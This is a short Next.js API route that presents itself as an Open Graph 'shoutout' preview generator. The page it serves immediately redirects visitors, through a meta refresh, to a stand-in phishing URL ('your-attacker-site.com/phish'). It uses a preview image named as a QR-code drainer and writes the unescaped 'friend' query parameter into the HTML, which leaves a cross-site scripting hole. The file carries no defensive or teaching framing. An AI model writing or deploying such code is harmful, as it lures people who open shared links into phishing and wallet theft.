// pages/api/og-image.ts
export default function handler(req, res) {
  const { username, friend } = req.query;

  res.setHeader("Content-Type", "text/html");
  res.status(200).send(`
    <html>
      <head>
        <meta property="og:title" content="You've been shouted out!" />
        <meta property="og:image" content="https://shoutout-generator.vercel.app/qr-code-drainer.png" />
        <meta http-equiv="refresh" content="0; url=https://your-attacker-site.com/phish" />
      </head>
      <body>
        <p>Redirecting shoutout for @${friend}...</p>
      </body>
    </html>
  `);
}
